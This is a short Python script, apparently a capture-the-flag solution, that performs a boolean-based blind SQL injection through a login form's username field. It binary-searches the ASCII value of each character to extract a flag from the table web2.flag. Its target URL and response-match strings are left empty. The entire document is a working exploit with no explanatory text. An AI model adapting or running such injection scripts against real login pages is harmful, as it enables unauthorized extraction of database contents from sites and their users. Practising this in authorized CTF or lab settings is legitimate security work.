import requests

url=""
flag=''
for i in range(1,50):
    f1=flag
    top=127
    low=33
    while low<=top:#向下整除
        mid=(top+low)//2
        data={'username':"admin' or if(ascii(substr((select flag from web2.flag),{},1))>{},1,0)#".format(str(i),str(mid)),'password':'admin'}
        data1={'username':"admin' or if(ascii(substr((select flag from web2.flag),{},1))={},1,0)#".format(str(i),str(mid)),'password':'admin'}
        try:
            r1=requests.post(url,data=data1)
            print(i,mid)
            if '' in r1.text:
                flag+=chr(mid)
                print(flag)
                break
            r=requests.post(url,data=data)
            if '' in r.text:
                low=mid+1
            else:
                top=mid-1
        except Exception as e:
            pass
    if flag==f1:
        break
